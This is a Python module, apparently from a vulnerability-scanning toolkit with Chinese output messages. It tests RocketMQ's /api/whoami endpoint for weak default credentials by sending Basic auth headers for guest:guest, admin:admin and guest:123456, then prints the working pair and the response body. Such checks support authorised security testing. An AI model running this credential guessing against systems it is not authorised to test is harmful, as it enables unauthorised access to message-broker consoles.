#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.reqset import ReqSet
from libs.public.outprint import OutPrintInfo
urllib3.disable_warnings()

class RocketUserScan:
    def poc1(self,url):
        head = {
            'User-Agent': self.header,
            'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q=',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        response = requests.get(url, headers=head, verify=self.verify, proxies=self.proexis)
        response.encoding = response.apparent_encoding
        if 'name' in response.text:
            OutPrintInfo("RocketMQ", '[b bright_red]存在RocketMQ弱口令漏洞[/b bright_red]')
            OutPrintInfo("RocketMQ", f'Url: [b bright_red]{url}[/b bright_red]')
            OutPrintInfo("RocketMQ", f'响应体: \n{response.text}')
            OutPrintInfo("RocketMQ",'用户名: [b bright_red]guest[/b bright_red] | 密码: [b bright_red]guest[/b bright_red]')
            return True
        return False
    def poc2(self,url):
        head = {
            'User-Agent': self.header,
            'Authorization': 'Basic YWRtaW46YWRtaW4=',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        response = requests.get(url, headers=head, verify=self.verify, proxies=self.proexis)
        response.encoding = response.apparent_encoding
        if 'name' in response.text:
            OutPrintInfo("RocketMQ", '[b bright_red]存在RocketMQ弱口令漏洞[/b bright_red]')
            OutPrintInfo("RocketMQ", f'Url: [b bright_red]{url}[/b bright_red]')
            OutPrintInfo("RocketMQ", f'响应体: \n{response.text}')
            OutPrintInfo("RocketMQ",'用户名: [b bright_red]admin[/b bright_red] | 密码: [b bright_red]admin[/b bright_red]')
            return True
        return False
    def poc3(self,url):
        head = {
            'User-Agent': self.header,
            'Authorization': 'Basic Z3Vlc3Q6MTIzNDU2',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        response = requests.get(url, headers=head, verify=self.verify, proxies=self.proexis)
        response.encoding = response.apparent_encoding
        if 'name' in response.text:
            OutPrintInfo("RocketMQ",'[b bright_red]存在RocketMQ弱口令漏洞[/b bright_red]')
            OutPrintInfo("RocketMQ",f'Url: [b bright_red]{url}[/b bright_red]')
            OutPrintInfo("RocketMQ",f'响应体: \n{response.text}')
            OutPrintInfo("RocketMQ",'用户名: [b bright_red]guest[/b bright_red] | 密码: [b bright_red]123456[/b bright_red]')
            return True
        return False
    def main(self,target):
        OutPrintInfo("RocketMQ",'开始检测RocketMQ弱口令漏洞')
        url = target[0].strip('/ ') + '/api/whoami'
        self.verify = target[1]
        self.header = target[2]
        proxy = target[3]

        reqset = ReqSet(proxy=proxy)
        self.proexis = reqset["proxy"]

        if self.poc1(url):
            return

        if self.poc2(url):
            return
        if self.poc3(url):
            return

        OutPrintInfo("RocketMQ",'RocketMQ弱口令漏洞检测结束')